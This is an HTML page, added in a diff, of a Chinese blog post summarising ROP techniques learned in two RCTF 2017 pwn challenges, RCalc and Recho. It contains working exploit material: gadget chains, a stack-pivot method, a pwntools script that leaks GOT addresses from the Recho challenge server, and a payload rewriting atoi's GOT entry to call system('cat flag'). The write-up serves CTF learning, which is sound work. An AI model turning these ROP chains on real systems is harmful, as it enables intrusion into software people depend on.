@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>ROP小结 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。">
+<meta name="keywords" content="Binary">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP小结">
+<meta property="og:url" content="http://0x48.pw/2017/05/23/0x33/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。">
+<meta property="og:updated_time" content="2017-05-23T15:44:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP小结">
+<meta name="twitter:description" content="这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x33" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/23/0x33/" class="article-date">
+      <time datetime="2017-05-23T04:01:12.000Z" itemprop="datePublished">2017-05-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ROP小结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。</p>
+<a id="more"></a>
+<p>本文不进行实例调试，用脑子DEBUG……详细文件可以去我的github上找…</p>
+<h1 id="RCalc"><a href="#RCalc" class="headerlink" title="RCalc"></a>RCalc</h1><p>首先是计算器这题，作者自己实现了一个canary，首先在每个函数开头通过<code>sub_400AAB</code>函数生成了一个随机数，存放到堆中，和栈上面，然后在函数结尾使用<code>sub_400B92</code>函数检查这个栈上的随机数和堆中的随机数是否一样。</p>
+<p>然后可以去看看<code>sub_400A06</code>函数，在存放canary的堆上面有个一个0x100的堆，用于存放需要保存的计算结果，这个结果保存的函数没设定边界值，所以可以覆盖到canary的堆，从而覆盖到canary。</p>
+<p>绕过canary后，在<code>sub_400FA2</code>函数中，scanf函数存在栈溢出，正常情况下想，之后就是通过ROP很容易就能getshell了。</p>
+<p>但是，这里有一个坑点，scanf函数的<code>%s</code>不能出现<code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>, <code>\x20</code></p>
+<p>经过测试，如果输入中出现这几个字符，会被转成<code>\x00</code>，或者之后的数据就不会被读入变量中。</p>
+<p>这对我来说非常致命，因为got表的地址中都含有<code>\x20</code>，还有一些ROP被这些字符限制着，当时还想到了一个别的思路，比如利用<code>read</code>函数或者<code>sub_400c4e</code>函数，但是没找到控制rdx的ROP所以没法用<code>read</code>函数，另外，就算能调用，也没有思路下一步该怎么做，该读到什么位置？然后该怎么通过<code>read</code>继续溢出？</p>
+<p>而关于<code>sub_400c4e</code>函数，虽然函数中含有<code>\x0c</code>字符，但是我找到了一个</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">add</span> eax, 0x48002018 ; <span class="attribute">test</span> eax, eax ; <span class="attribute">je</span> 0x400803 ; <span class="attribute">call</span> rax</div></pre></td></tr></table></figure>
+<p>通过这个ROP就能调用<code>sub_400c4e</code>了，而<code>rdx</code>为最后一次choice输入的值，因为处理这个输入值得时候有个cdqe，虽然如果我输入0x100000005在判断中也是5，通过这个思路，可以让<code>sub_400c4e</code>函数中进行溢出，rdi和rsi也都是可控的。</p>
+<p>但是在测试中发现，首先我不知道栈地址，所以没法控制rsi，而在<code>sub_400FA2</code>函数的ret指令时，rsi正好就是一个栈地址，在当前栈地址的很上面，这种情况下，栈溢出会覆盖掉<code>sub_400c4e</code>的局部变量，导致没法成功进行栈溢出。</p>
+<p>在比赛结束之后，看来国外的一篇wp后，学到了两个知识点: <a href="http://hama.hatenadiary.jp/entry/2017/05/22/092142" target="_blank" rel="external">http://hama.hatenadiary.jp/entry/2017/05/22/092142</a></p>
+<p>首先是他们找的ROP：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">mov</span> rdx, r13 ; <span class="attribute">mov</span> rsi, r14 ; <span class="attribute">mov</span> edi, r15d ; <span class="attribute">call</span> qword [r12+rbx*<span class="number">8</span>];</div><div class="line"><span class="attribute">pop</span> rbx ; <span class="attribute">pop</span> rbp ; <span class="attribute">pop</span> r12 ; <span class="attribute">pop</span> r13 ; <span class="attribute">pop</span> r14 ; <span class="attribute">pop</span> r15; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
+<p>通过这个ROP基本可以调用任意函数了，我找ROP一般是使用默认的命令:</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> ROPgadget --<span class="keyword">binary</span> RCalc</div></pre></td></tr></table></figure>
+<p>但是却没有这个ROP，需要用</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$</span> <span class="comment">ROPgadget</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">binary</span> <span class="comment">RCalc</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">depth</span> <span class="comment">11</span></div></pre></td></tr></table></figure>
+<p>才有第二句ROP，而第一句还是没有。。所以我发现，我在找ROP上还是太菜了….</p>
+<p>其实，当时我已经基本可以做到调用任意函数了，但是关键点还是第二点。</p>
+<p>使用:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">leave</span>  ; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
+<p>来修改栈地址，这样一来思路就很清晰了。<br>找一段可以写的地址，比如bss区域，写入ROP，然后再把rsp修改成该地址，就可以getshell了，同read函数向bss区域写值，然后使用<code>leave</code>修改rsp</p>
+<p>我还是太菜，从来没想过修改栈地址……</p>
+<h1 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h1><p>本来也是一道简单的栈溢出，但循环的判断:</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">while(<span class="name">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x10)&gt;0)</div></pre></td></tr></table></figure>
+<p>要栈溢出首先得先停了这个循环，在shell中可以使用ctrl+d表示EOF，但是脚本咋写？<br>发现pwntools可以用下面的命令发送EOF</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s = remote(xxxx,xx)</div><div class="line">s<span class="selector-class">.sock</span><span class="selector-class">.shutdown</span>(socket.SHUT_RW)</div></pre></td></tr></table></figure>
+<p>但是这样我们没法继续输入了，所以我们需要发送一次payload就getflag，我们只能getflag而不能getshell，因为服务器已经关闭了接收我们数据的连接。</p>
+<p>这题没有libc，所以写ROP又是一个技术活….</p>
+<p>使用下面这个PoC:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line">debug = 1</div><div class="line">if debug:</div><div class="line">    p = remote(<span class="string">"127.0.0.1"</span>, 10001)</div><div class="line"><span class="section">else:</span></div><div class="line">    p = remote(<span class="string">"recho.2017.teamrois.cn"</span>, 9527)</div><div class="line">e = ELF('Recho')</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">padding = 0x38*'a'          <span class="comment">#padding</span></div><div class="line"><span class="comment"># write(1, got['read'], 8)</span></div><div class="line">payload = <span class="string">""</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['read'])  <span class="comment"># rsi = got.plt read</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"><span class="comment"># write(1, got['write'], 8)</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['atoi'])  <span class="comment"># rsi = got.plt atoi</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"></div><div class="line"></div><div class="line">p.readuntil(<span class="string">"server!\n"</span>)</div><div class="line">p.sendline('1000')</div><div class="line">p.sendline(padding + payload)</div><div class="line">p.recv()</div><div class="line">p.sock.shutdown(1)</div><div class="line">print u64(p.recv(8)) - u64(p.recv(8))</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>经过远程和本地测试对比，发现远程的libc应该和我本地的一样</p>
+<p>然后使用本地的libc写payload就好了。。</p>
+<p>思路是改写got表中随便一个函数的地址改成system就好了，比如我修改的是atoi函数，然后找binary中的ROP，找到下面三个：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">rax</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">add</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span><span class="comment">; ret;</span></div></pre></td></tr></table></figure>
+<p>通过这三个，我们就能修改偏移了，比如:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601040)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601040</span>; atoi</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(0x10)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>  <span class="attr"># pop rax; ret;   rax = 0</span>x<span class="number">10</span>; add [rdi], al; ret;</div><div class="line"></div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601041)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601041</span>;</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(229)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>   <span class="attr"># pop rax; ret;   rax=0</span>xe<span class="number">5</span>;   add [rdi], al; ret;</div></pre></td></tr></table></figure>
+<p>这相当于got表中atoi函数的地址加上0xe510</p>
+<p>同样再使用上面的ROP往bss中写入<code>cat flag</code>，最后输出的指令是<code>system(&#39;cat flag&#39;)</code></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本以为栈溢出都会了，其实还是太菜…..</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/05/23/0x33/">ROP小结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2017-05-23, 12:01:12</p>
+        <p><span>最后更新:</span>2017-05-23, 23:44:44</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/05/23/0x33/" title="ROP小结">http://0x48.pw/2017/05/23/0x33/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/05/23/0x33/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/04/05/0x32/">
+                    Triton学习笔记(三)
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCalc"><span class="toc-number">1.</span> <span class="toc-text">RCalc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recho"><span class="toc-number">2.</span> <span class="toc-text">Recho</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/04/05/0x32/" title="下一篇: Triton学习笔记(三)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
